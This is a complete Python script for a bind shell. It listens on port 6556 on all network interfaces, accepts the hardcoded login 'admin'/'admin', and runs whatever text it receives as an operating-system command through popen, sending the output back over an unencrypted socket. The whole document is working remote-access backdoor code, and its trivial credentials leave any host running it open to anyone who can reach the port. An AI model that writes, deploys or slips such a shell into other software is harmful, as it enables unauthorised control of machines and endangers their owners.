from os import popen, chdir
import socket

USERNAME = "admin"
PASSWORD = "admin"

def connection(conn: socket.socket) -> bool:

	conn.sendall("Username : ".encode("utf-8"))
	username = conn.recv(1024).decode("utf-8").strip()
	
	conn.sendall("Password : ".encode("utf-8"))
	password = conn.recv(1024).decode("utf-8").strip()

	if username == USERNAME and password == PASSWORD:
		return True
	else:
		return False


def main():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", 6556))

	while True:

		s.listen()
		conn = s.accept()[0]
		
		if connection(conn):

			conn.sendall(f"\nWelcome back, {USERNAME}\nUse \'quit\' to exit the shell\n\n$ ".encode("utf-8"))

			with conn:

				i = True
				while i is True:
				
					data = conn.recv(1024).decode("utf-8").strip()
					if data == "quit":
						i = False

					elif data.startswith("cd"):
						chdir(data.split(" ")[1])
						conn.sendall("\n$ ".encode("utf-8"))

					else:

						cmd = popen(data).read().strip() +"\n\n$ "
						conn.sendall(cmd.encode("utf-8"))
		
		else:
			conn.sendall("Invalid username or password !\n".encode("utf-8"))
			conn.close()

if __name__ == "__main__":
	main()